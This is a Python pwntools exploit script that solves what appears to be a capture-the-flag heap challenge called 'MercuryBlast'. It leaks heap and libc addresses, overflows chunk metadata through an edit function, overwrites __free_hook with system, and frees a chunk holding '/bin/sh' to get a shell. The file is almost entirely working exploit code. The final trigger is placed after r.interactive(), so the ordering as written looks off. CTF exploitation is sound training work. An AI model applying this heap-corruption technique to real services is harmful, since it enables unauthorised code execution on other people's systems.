from pwn import *

r = process('./MercuryBlast_ldd')
# r = remote('ash-chal.firebird.sh', 36034)
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.arch='amd64'

def add(size, temper=1.0, description=b"\n"):
    r.recvuntil(b'Your choice: ')
    r.sendline(b'1')
    r.recvuntil(b'Input Temperature: ')
    r.sendline(str(temper).encode('utf8'))
    r.recvuntil(b'Input Description Size: ')
    r.sendline(str(size).encode('utf8'))
    r.recvuntil(b'Input Description: ')
    r.send(description)

def show():
    r.recvuntil(b'Your choice: ')
    r.sendline(b'2')

def delete(idx):
    r.recvuntil(b'Your choice: ')
    r.sendline(b'3')
    r.recvuntil(b'Input Index: ')
    r.sendline(str(idx).encode('utf8'))

def edit(idx, size, temper=4.0, description=b"\n"):
    r.recvuntil(b'Your choice: ')
    r.sendline(b'4')
    r.recvuntil(b'Input index: ')
    r.sendline(str(idx).encode('utf8'))
    r.recvuntil(b'Input Temperature: ')
    r.sendline(str(temper).encode('utf8'))
    r.recvuntil(b'Input Description Size: ')
    r.sendline(str(size).encode('utf8'))
    r.recvuntil(b'Input Description: ')
    r.send(description)

add(0x20) # 0
add(0x18) # 1
delete(0)
delete(1)
add(0x18) # 0
show()
r.recvuntil(b'Description: ')
recv = r.recv(6)
print(f"received: {recv}")
heap_base = u64(recv.ljust(8, b'\x00')) - 0x20a
print(f"heap_base: {hex(heap_base)}")

add(0x20) # 1
add(0x200) # 2
add(0x200) # 3
add(0x200, 1, b"/bin/sh\x00"+b'\x00'*100) # 4
payload = b'a'*0x20+flat(0, 0x21, 0, 0x18, heap_base+0x310, 0x481)
edit(1, len(payload), 1.0, payload)
delete(0)
add(0x30)
show()

r.recvuntil(b'Description: ')
recv = r.recv(6)
print(f"received: {recv}")
libc_offset = u64(recv.ljust(8, b'\x00'))
print(f"libc_offset: {hex(libc_offset)}")
libc_base = libc_offset-0x1ecf0a
print(f"libc_base: {hex(libc_base)}")

payload = b'a'*0x20+flat(0, 0x21, 0, 0x30, libc_base+libc.sym["__free_hook"], 0x41)
edit(1, len(payload), 1.0, payload)
payload = p64(libc_base+libc.sym['system'])
edit(0, len(payload), 1.0, payload)
r.interactive()
delete(4)